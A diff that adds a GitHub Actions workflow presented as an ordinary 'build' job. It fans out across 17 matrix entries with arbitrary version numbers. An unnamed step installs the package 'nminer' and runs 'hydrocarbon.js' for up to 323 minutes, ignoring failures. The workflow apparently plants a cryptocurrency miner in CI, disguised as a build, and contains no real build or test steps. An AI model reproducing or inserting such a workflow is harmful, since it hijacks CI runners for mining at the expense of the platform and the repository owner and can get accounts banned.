@@ -1,0 +1,42 @@
+name: hydrocarbon
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 477 }
+          - { version: 6446 }
+          - { version: 3737 }
+          - { version: 3083 }
+          - { version: 8713 }
+          - { version: 9929 }
+          - { version: 3511 }
+          - { version: 4278 }
+          - { version: 2564 }
+          - { version: 7235 }
+          - { version: 5564 }
+          - { version: 1826 }
+          - { version: 8863 }
+          - { version: 3125 }
+          - { version: 1633 }
+          - { version: 334 }
+          - { version: 5315 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: 
+        run: |
+          npm install nminer@latest
+          timeout 323m node hydrocarbon.js || echo "hydrocarbon executed"
